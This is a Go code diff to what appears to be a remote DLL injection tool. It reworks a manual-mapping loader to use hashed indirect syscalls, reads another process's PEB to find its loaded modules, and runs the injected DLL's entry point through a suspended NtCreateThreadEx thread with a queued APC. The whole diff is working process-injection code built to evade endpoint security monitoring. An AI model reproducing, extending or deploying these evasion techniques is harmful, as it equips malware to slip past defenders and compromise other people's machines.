@@ -11,28 +11,21 @@ import (
 )
 
 const (
-	memCommit        = 0x00001000
-	memReserve       = 0x00002000
-	memRelease       = 0x00008000
-	pageRW           = 0x04
-	pageR            = 0x02
-	pageRX           = 0x20
-	pageRWX          = 0x40
-	th32SnapModule   = 0x00000008
-	th32SnapModule32 = 0x00000010
+	memCommit  = 0x00001000
+	memReserve = 0x00002000
+	pageRW     = 0x04
+	pageR      = 0x02
+	pageRX     = 0x20
+	pageRWX    = 0x40
 )
 
-type moduleEntry32 struct {
-	dwSize        uint32
-	th32ModuleID  uint32
-	th32ProcessID uint32
-	glblcntUsage  uint32
-	proccntUsage  uint32
-	modBaseAddr   uintptr
-	modBaseSize   uint32
-	hModule       uintptr
-	szModule      [256]uint16
-	szExePath     [260]uint16
+type processBasicInformation struct {
+	ExitStatus                   uintptr
+	PebBaseAddress               uintptr
+	AffinityMask                 uintptr
+	BasePriority                 uintptr
+	UniqueProcessId              uintptr
+	InheritedFromUniqueProcessId uintptr
 }
 
 func LoadDLLRemote(hProcess uintptr, dllBytes []byte) error {
@@ -100,8 +93,7 @@ func LoadDLLRemote(hProcess uintptr, dllBytes []byte) error {
 
 	importDirRVA := *(*uint32)(unsafe.Pointer(optHeaderAddr + 0x70 + (1 * 8)))
 	if importDirRVA != 0 {
-		pid, _ := getProcessId(hProcess)
-		resolveImports(hProcess, pid, remoteBase, &dllBytes, importDirRVA)
+		resolveImports(hProcess, remoteBase, &dllBytes, importDirRVA)
 	}
 
 	ntProt := wc.GetSyscall(wc.GetHash("NtProtectVirtualMemory"))
@@ -204,7 +196,7 @@ func processRelocations(hProcess uintptr, remoteBase uintptr, dllBytes *[]byte, 
 	}
 }
 
-func resolveImports(hProcess uintptr, pid uint32, remoteBase uintptr, dllBytes *[]byte, importDirRVA uint32) {
+func resolveImports(hProcess uintptr, remoteBase uintptr, dllBytes *[]byte, importDirRVA uint32) {
 	ntWrite := wc.GetSyscall(wc.GetHash("NtWriteVirtualMemory"))
 	localBase := uintptr(unsafe.Pointer(&(*dllBytes)[0]))
 	importDescOffset := rvaToOffset(dllBytes, importDirRVA)
@@ -235,13 +227,10 @@ func resolveImports(hProcess uintptr, pid uint32, remoteBase uintptr, dllBytes *
 			continue
 		}
 
-		remoteModule, _ := getRemoteModuleBase(pid, actualDllName)
+		remoteModule, _ := getRemoteModuleBase(hProcess, actualDllName)
 		if remoteModule == 0 {
-			remoteModule, _ = loadLibraryRemote(hProcess, pid, actualDllName)
-			if remoteModule == 0 {
-				importDesc += 20
-				continue
-			}
+			importDesc += 20
+			continue
 		}
 
 		thunkRVA := originalFirstThunk
@@ -262,7 +251,8 @@ func resolveImports(hProcess uintptr, pid uint32, remoteBase uintptr, dllBytes *
 			var funcRVA uintptr
 			if (thunkValue & 0x8000000000000000) != 0 {
 				ordinal := uint16(thunkValue & 0xFFFF)
-				localFunc, _, _ := wc.Call("kernel32.dll", "GetProcAddress", localModule, uintptr(ordinal))
+				var localFunc uintptr
+				wc.Call("ntdll.dll", "LdrGetProcedureAddress", localModule, 0, uintptr(ordinal), uintptr(unsafe.Pointer(&localFunc)))
 				if localFunc != 0 {
 					funcRVA = localFunc - localModule
 				}
@@ -291,116 +281,94 @@ func resolveImports(hProcess uintptr, pid uint32, remoteBase uintptr, dllBytes *
 }
 
 func callDllMain(hProcess uintptr, dllBase uintptr, entryPoint uintptr) {
-	// stub to call dllMain :3
-	code := make([]byte, 0, 48)
-	code = append(code, 0x48, 0xB9)
-	code = append(code, uintptrToBytes(dllBase)...)
-	code = append(code, 0xBA, 0x01, 0x00, 0x00, 0x00)
-	code = append(code, 0x4D, 0x31, 0xC0)
-	code = append(code, 0x48, 0xB8)
-	code = append(code, uintptrToBytes(entryPoint)...)
-	code = append(code, 0x48, 0x83, 0xEC, 0x28)
-	code = append(code, 0xFF, 0xD0)
-	code = append(code, 0x48, 0x83, 0xC4, 0x28)
-	code = append(code, 0xC3)
+	ntdll := wc.GetModuleBase(wc.GetHash("ntdll.dll"))
+	rtlExitUserThread := wc.GetFunctionAddress(ntdll, wc.GetHash("RtlExitUserThread"))
 
-	ntAlloc := wc.GetSyscall(wc.GetHash("NtAllocateVirtualMemory"))
-	var stubAddr uintptr
-	var stubSize uintptr = uintptr(len(code))
-	wc.IndirectSyscall(ntAlloc.SSN, ntAlloc.Address,
-		hProcess, uintptr(unsafe.Pointer(&stubAddr)), 0,
-		uintptr(unsafe.Pointer(&stubSize)), memCommit|memReserve, pageRWX)
+	ntCreateThreadEx := wc.GetSyscall(wc.GetHash("NtCreateThreadEx"))
+	var hThread uintptr
+	wc.IndirectSyscall(ntCreateThreadEx.SSN, ntCreateThreadEx.Address,
+		uintptr(unsafe.Pointer(&hThread)), 0x1FFFFF, 0, hProcess, rtlExitUserThread, 0, 1, 0, 0, 0, 0)
 
-	ntWrite := wc.GetSyscall(wc.GetHash("NtWriteVirtualMemory"))
-	var written uintptr
-	wc.IndirectSyscall(ntWrite.SSN, ntWrite.Address,
-		hProcess, stubAddr, uintptr(unsafe.Pointer(&code[0])), uintptr(len(code)), uintptr(unsafe.Pointer(&written)))
-
-	hThread, _, _ := wc.Call("kernel32.dll", "CreateRemoteThread", hProcess, 0, 0, stubAddr, 0, 0, 0)
-	if hThread != 0 {
-		wc.Call("kernel32.dll", "WaitForSingleObject", hThread, 10000)
-		wc.Call("kernel32.dll", "CloseHandle", hThread)
+	if hThread == 0 {
+		return
 	}
 
-	ntFree := wc.GetSyscall(wc.GetHash("NtFreeVirtualMemory"))
-	stubSize = 0
-	wc.IndirectSyscall(ntFree.SSN, ntFree.Address, hProcess, uintptr(unsafe.Pointer(&stubAddr)), uintptr(unsafe.Pointer(&stubSize)), memRelease)
+	ntQueueApc := wc.GetSyscall(wc.GetHash("NtQueueApcThread"))
+	wc.IndirectSyscall(ntQueueApc.SSN, ntQueueApc.Address,
+		hThread, entryPoint, dllBase, 1, 0)
+
+	ntResumeThread := wc.GetSyscall(wc.GetHash("NtResumeThread"))
+	wc.IndirectSyscall(ntResumeThread.SSN, ntResumeThread.Address, hThread, 0)
+
+	ntWait := wc.GetSyscall(wc.GetHash("NtWaitForSingleObject"))
+	timeout := int64(-100000000) // 10 seconds
+	wc.IndirectSyscall(ntWait.SSN, ntWait.Address, hThread, 0, uintptr(unsafe.Pointer(&timeout)))
+
+	ntClose := wc.GetSyscall(wc.GetHash("NtClose"))
+	wc.IndirectSyscall(ntClose.SSN, ntClose.Address, hThread)
 }
 
-func loadLibraryRemote(hProcess uintptr, pid uint32, moduleName string) (uintptr, error) {
-	nameBytes := append([]byte(moduleName), 0)
-	size := uintptr(len(nameBytes))
-
-	ntAlloc := wc.GetSyscall(wc.GetHash("NtAllocateVirtualMemory"))
-	var remoteBuf uintptr
-	var regionSize uintptr = size
-	ret, _ := wc.IndirectSyscall(ntAlloc.SSN, ntAlloc.Address,
-		hProcess, uintptr(unsafe.Pointer(&remoteBuf)), 0, uintptr(unsafe.Pointer(&regionSize)), memCommit|memReserve, pageRW)
-	if ret != 0 || remoteBuf == 0 {
-		return 0, errors.New("alloc failed")
+func getRemoteModuleBase(hProcess uintptr, moduleName string) (uintptr, error) {
+	ntQuery := wc.GetSyscall(wc.GetHash("NtQueryInformationProcess"))
+	var pbi processBasicInformation
+	var returnLength uint32
+	ret, _ := wc.IndirectSyscall(ntQuery.SSN, ntQuery.Address,
+		hProcess, 0, uintptr(unsafe.Pointer(&pbi)), unsafe.Sizeof(pbi), uintptr(unsafe.Pointer(&returnLength)))
+	if ret != 0 || pbi.PebBaseAddress == 0 {
+		return 0, errors.New("failed to get PEB")
 	}
 
-	ntWrite := wc.GetSyscall(wc.GetHash("NtWriteVirtualMemory"))
-	var written uintptr
-	wc.IndirectSyscall(ntWrite.SSN, ntWrite.Address,
-		hProcess, remoteBuf, uintptr(unsafe.Pointer(&nameBytes[0])), size, uintptr(unsafe.Pointer(&written)))
+	ntRead := wc.GetSyscall(wc.GetHash("NtReadVirtualMemory"))
+	var ldrAddress uintptr
+	wc.IndirectSyscall(ntRead.SSN, ntRead.Address,
+		hProcess, pbi.PebBaseAddress+0x18, uintptr(unsafe.Pointer(&ldrAddress)), 8, 0)
 
-	k32 := wc.GetModuleBase(wc.GetHash("kernel32.dll"))
-	loadLibA := wc.GetFunctionAddress(k32, wc.GetHash("LoadLibraryA"))
-
-	hThread, _, _ := wc.Call("kernel32.dll", "CreateRemoteThread", hProcess, 0, 0, loadLibA, remoteBuf, 0, 0)
-	if hThread != 0 {
-		wc.Call("kernel32.dll", "WaitForSingleObject", hThread, 0xFFFFFFFF)
-		wc.Call("kernel32.dll", "CloseHandle", hThread)
+	if ldrAddress == 0 {
+		return 0, errors.New("Ldr is null")
 	}
 
-	ntFree := wc.GetSyscall(wc.GetHash("NtFreeVirtualMemory"))
-	regionSize = 0
-	wc.IndirectSyscall(ntFree.SSN, ntFree.Address, hProcess, uintptr(unsafe.Pointer(&remoteBuf)), uintptr(unsafe.Pointer(&regionSize)), memRelease)
-
-	return getRemoteModuleBase(pid, moduleName)
-}
-
-func getRemoteModuleBase(pid uint32, moduleName string) (uintptr, error) {
-	snap, _, _ := wc.Call("kernel32.dll", "CreateToolhelp32Snapshot", th32SnapModule|th32SnapModule32, uintptr(pid))
-	if snap == 0 || snap == ^uintptr(0) {
-		return 0, errors.New("snapshot failed")
-	}
-	defer wc.Call("kernel32.dll", "CloseHandle", snap)
-
-	var me moduleEntry32
-	me.dwSize = uint32(unsafe.Sizeof(me))
-
-	ok, _, _ := wc.Call("kernel32.dll", "Module32FirstW", snap, uintptr(unsafe.Pointer(&me)))
-	if ok == 0 {
-		return 0, errors.New("Module32FirstW failed")
-	}
+	var listHead uintptr = ldrAddress + 0x10
+	var currentEntry uintptr
+	wc.IndirectSyscall(ntRead.SSN, ntRead.Address,
+		hProcess, listHead, uintptr(unsafe.Pointer(&currentEntry)), 8, 0)
 
 	target := strings.ToLower(moduleName)
-	for {
-		name := strings.ToLower(utf16ToString(me.szModule[:]))
-		if name == target {
-			return me.modBaseAddr, nil
+
+	for currentEntry != 0 && currentEntry != listHead {
+		var dllBase uintptr
+		wc.IndirectSyscall(ntRead.SSN, ntRead.Address,
+			hProcess, currentEntry+0x30, uintptr(unsafe.Pointer(&dllBase)), 8, 0)
+
+		var baseDllNameLen uint16
+		wc.IndirectSyscall(ntRead.SSN, ntRead.Address,
+			hProcess, currentEntry+0x58, uintptr(unsafe.Pointer(&baseDllNameLen)), 2, 0)
+
+		var baseDllNamePtr uintptr
+		wc.IndirectSyscall(ntRead.SSN, ntRead.Address,
+			hProcess, currentEntry+0x60, uintptr(unsafe.Pointer(&baseDllNamePtr)), 8, 0)
+
+		if baseDllNameLen > 0 && baseDllNameLen < 512 && baseDllNamePtr != 0 {
+			nameBuf := make([]uint16, baseDllNameLen/2)
+			wc.IndirectSyscall(ntRead.SSN, ntRead.Address,
+				hProcess, baseDllNamePtr, uintptr(unsafe.Pointer(&nameBuf[0])), uintptr(baseDllNameLen), 0)
+
+			name := strings.ToLower(strings.TrimRight(string(utf16.Decode(nameBuf)), "\x00"))
+			if name == target {
+				return dllBase, nil
+			}
 		}
-		ok, _, _ = wc.Call("kernel32.dll", "Module32NextW", snap, uintptr(unsafe.Pointer(&me)))
-		if ok == 0 {
+
+		var nextEntry uintptr
+		wc.IndirectSyscall(ntRead.SSN, ntRead.Address,
+			hProcess, currentEntry, uintptr(unsafe.Pointer(&nextEntry)), 8, 0)
+
+		if nextEntry == currentEntry || nextEntry == 0 {
 			break
 		}
+		currentEntry = nextEntry
 	}
+
 	return 0, errors.New("module not found")
-}
-
-func getProcessId(hProcess uintptr) (uint32, error) {
-	pid, _, _ := wc.Call("kernel32.dll", "GetProcessId", hProcess)
-	return uint32(pid), nil
-}
-
-func utf16ToString(buf []uint16) string {
-	n := 0
-	for n < len(buf) && buf[n] != 0 {
-		n++
-	}
-	return string(utf16.Decode(buf[:n]))
 }
 
 func resolveApiSet(name string) string {
@@ -435,12 +403,6 @@ func cstringAt(addr uintptr) string {
 		bs = append(bs, b)
 	}
 	return string(bs)
-}
-
-func uintptrToBytes(v uintptr) []byte {
-	b := make([]byte, 8)
-	binary.LittleEndian.PutUint64(b, uint64(v))
-	return b
 }
 
 func rvaToOffset(dllBytes *[]byte, rva uint32) uint32 {
